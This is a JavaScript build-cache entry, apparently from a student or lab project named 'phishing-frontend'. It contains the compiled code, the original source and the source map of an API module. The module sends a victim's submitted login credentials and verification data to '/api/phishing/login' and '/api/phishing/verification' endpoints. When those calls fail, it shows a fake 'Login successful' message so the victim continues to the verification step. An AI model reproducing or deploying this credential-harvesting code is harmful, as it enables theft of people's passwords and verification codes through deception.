{"ast":null,"code":"import axios from 'axios';\n\n// Try different backend ports since they might be in use\nconst BACKEND_PORTS = [8000, 8001, 8002, 3001];\nconst API_BASE = process.env.NODE_ENV === 'production' ? '' : `http://localhost:${BACKEND_PORTS[0]}`;\nexport const submitCredentials = async credentials => {\n  try {\n    // Try the backend API endpoint first\n    const response = await axios.post(`${API_BASE}/api/phishing/login`, credentials, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    // If API endpoint fails, try the direct phishing route\n    try {\n      const response = await axios.post(`${API_BASE}/phishing/login`, credentials, {\n        headers: {\n          'Content-Type': 'application/json',\n          'Accept': 'application/json'\n        }\n      });\n      return response.data;\n    } catch (fallbackError) {\n      console.error('Login error:', fallbackError);\n      // For demo purposes, always succeed and proceed to verification\n      return {\n        success: true,\n        message: 'Login successful'\n      };\n    }\n  }\n};\nexport const submitVerification = async verificationData => {\n  try {\n    // Try the backend API endpoint first\n    const response = await axios.post(`${API_BASE}/api/phishing/verification`, verificationData, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    // If API endpoint fails, try the direct phishing route\n    try {\n      const response = await axios.post(`${API_BASE}/phishing/verification`, verificationData, {\n        headers: {\n          'Content-Type': 'application/json',\n          'Accept': 'application/json'\n        }\n      });\n      return response.data;\n    } catch (fallbackError) {\n      console.error('Verification error:', fallbackError);\n      // For demo purposes, always succeed\n      return {\n        success: true,\n        message: 'Verification successful'\n      };\n    }\n  }\n};","map":{"version":3,"names":["axios","BACKEND_PORTS","API_BASE","process","env","NODE_ENV","submitCredentials","credentials","response","post","headers","data","error","fallbackError","console","success","message","submitVerification","verificationData"],"sources":["/media/luiss/D/upch/cyb/xploit/phishing-frontend/src/services/api.js"],"sourcesContent":["import axios from 'axios';\n\n// Try different backend ports since they might be in use\nconst BACKEND_PORTS = [8000, 8001, 8002, 3001];\nconst API_BASE = process.env.NODE_ENV === 'production' ? '' : `http://localhost:${BACKEND_PORTS[0]}`;\n\nexport const submitCredentials = async (credentials) => {\n  try {\n    // Try the backend API endpoint first\n    const response = await axios.post(`${API_BASE}/api/phishing/login`, credentials, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    // If API endpoint fails, try the direct phishing route\n    try {\n      const response = await axios.post(`${API_BASE}/phishing/login`, credentials, {\n        headers: {\n          'Content-Type': 'application/json',\n          'Accept': 'application/json'\n        }\n      });\n      return response.data;\n    } catch (fallbackError) {\n      console.error('Login error:', fallbackError);\n      // For demo purposes, always succeed and proceed to verification\n      return { success: true, message: 'Login successful' };\n    }\n  }\n};\n\nexport const submitVerification = async (verificationData) => {\n  try {\n    // Try the backend API endpoint first\n    const response = await axios.post(`${API_BASE}/api/phishing/verification`, verificationData, {\n      headers: {\n        'Content-Type': 'application/json',\n        'Accept': 'application/json'\n      }\n    });\n    return response.data;\n  } catch (error) {\n    // If API endpoint fails, try the direct phishing route\n    try {\n      const response = await axios.post(`${API_BASE}/phishing/verification`, verificationData, {\n        headers: {\n          'Content-Type': 'application/json',\n          'Accept': 'application/json'\n        }\n      });\n      return response.data;\n    } catch (fallbackError) {\n      console.error('Verification error:', fallbackError);\n      // For demo purposes, always succeed\n      return { success: true, message: 'Verification successful' };\n    }\n  }\n};"],"mappings":"AAAA,OAAOA,KAAK,MAAM,OAAO;;AAEzB;AACA,MAAMC,aAAa,GAAG,CAAC,IAAI,EAAE,IAAI,EAAE,IAAI,EAAE,IAAI,CAAC;AAC9C,MAAMC,QAAQ,GAAGC,OAAO,CAACC,GAAG,CAACC,QAAQ,KAAK,YAAY,GAAG,EAAE,GAAG,oBAAoBJ,aAAa,CAAC,CAAC,CAAC,EAAE;AAEpG,OAAO,MAAMK,iBAAiB,GAAG,MAAOC,WAAW,IAAK;EACtD,IAAI;IACF;IACA,MAAMC,QAAQ,GAAG,MAAMR,KAAK,CAACS,IAAI,CAAC,GAAGP,QAAQ,qBAAqB,EAAEK,WAAW,EAAE;MAC/EG,OAAO,EAAE;QACP,cAAc,EAAE,kBAAkB;QAClC,QAAQ,EAAE;MACZ;IACF,CAAC,CAAC;IACF,OAAOF,QAAQ,CAACG,IAAI;EACtB,CAAC,CAAC,OAAOC,KAAK,EAAE;IACd;IACA,IAAI;MACF,MAAMJ,QAAQ,GAAG,MAAMR,KAAK,CAACS,IAAI,CAAC,GAAGP,QAAQ,iBAAiB,EAAEK,WAAW,EAAE;QAC3EG,OAAO,EAAE;UACP,cAAc,EAAE,kBAAkB;UAClC,QAAQ,EAAE;QACZ;MACF,CAAC,CAAC;MACF,OAAOF,QAAQ,CAACG,IAAI;IACtB,CAAC,CAAC,OAAOE,aAAa,EAAE;MACtBC,OAAO,CAACF,KAAK,CAAC,cAAc,EAAEC,aAAa,CAAC;MAC5C;MACA,OAAO;QAAEE,OAAO,EAAE,IAAI;QAAEC,OAAO,EAAE;MAAmB,CAAC;IACvD;EACF;AACF,CAAC;AAED,OAAO,MAAMC,kBAAkB,GAAG,MAAOC,gBAAgB,IAAK;EAC5D,IAAI;IACF;IACA,MAAMV,QAAQ,GAAG,MAAMR,KAAK,CAACS,IAAI,CAAC,GAAGP,QAAQ,4BAA4B,EAAEgB,gBAAgB,EAAE;MAC3FR,OAAO,EAAE;QACP,cAAc,EAAE,kBAAkB;QAClC,QAAQ,EAAE;MACZ;IACF,CAAC,CAAC;IACF,OAAOF,QAAQ,CAACG,IAAI;EACtB,CAAC,CAAC,OAAOC,KAAK,EAAE;IACd;IACA,IAAI;MACF,MAAMJ,QAAQ,GAAG,MAAMR,KAAK,CAACS,IAAI,CAAC,GAAGP,QAAQ,wBAAwB,EAAEgB,gBAAgB,EAAE;QACvFR,OAAO,EAAE;UACP,cAAc,EAAE,kBAAkB;UAClC,QAAQ,EAAE;QACZ;MACF,CAAC,CAAC;MACF,OAAOF,QAAQ,CAACG,IAAI;IACtB,CAAC,CAAC,OAAOE,aAAa,EAAE;MACtBC,OAAO,CAACF,KAAK,CAAC,qBAAqB,EAAEC,aAAa,CAAC;MACnD;MACA,OAAO;QAAEE,OAAO,EAAE,IAAI;QAAEC,OAAO,EAAE;MAA0B,CAAC;IAC9D;EACF;AACF,CAAC","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}